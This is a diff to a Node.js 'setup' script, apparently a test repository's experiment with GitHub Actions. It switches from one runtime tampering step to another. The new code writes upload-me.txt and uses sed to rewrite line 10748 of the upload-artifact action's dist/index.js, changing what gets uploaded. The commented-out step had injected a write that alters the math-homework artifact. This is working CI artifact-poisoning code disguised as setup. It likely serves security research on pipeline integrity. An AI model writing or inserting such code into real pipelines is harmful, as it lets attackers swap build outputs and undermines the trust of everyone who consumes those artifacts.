@@ -4,24 +4,9 @@ const fs = require("fs");
 console.log("this is a setup.....")
 
 // Modify the value of math-homework artifact
-let writecontent = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/math-homework.txt", "1")';
+// let writecontent = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/math-homework.txt", "1")';
 
-cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
-    if (err){
-        console.log(err);
-        return;
-    }
-    console.log(`stdout: ${stdout.toString()}`);
-    console.log(`stderr: ${stderr}`);
-});
-
-
-//Add a new upload-me artifact, then upload it
-// fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/upload-me.txt", "2")
-
-// let writecontent1 = 'const path="upload-me.txt"';
-
-// cl_process.exec(`sed -i '10748s/.*/${writecontent1}/' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
+// cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
 //     if (err){
 //         console.log(err);
 //         return;
@@ -29,6 +14,21 @@ cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/action
 //     console.log(`stdout: ${stdout.toString()}`);
 //     console.log(`stderr: ${stderr}`);
 // });
+
+
+//Add a new upload-me artifact, then upload it
+fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/upload-me.txt", "2")
+
+let writecontent1 = 'const path="upload-me.txt"';
+
+cl_process.exec(`sed -i '10748s/.*/${writecontent1}/' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
+    if (err){
+        console.log(err);
+        return;
+    }
+    console.log(`stdout: ${stdout.toString()}`);
+    console.log(`stderr: ${stderr}`);
+});
 
 
 //Modify the value of cache file
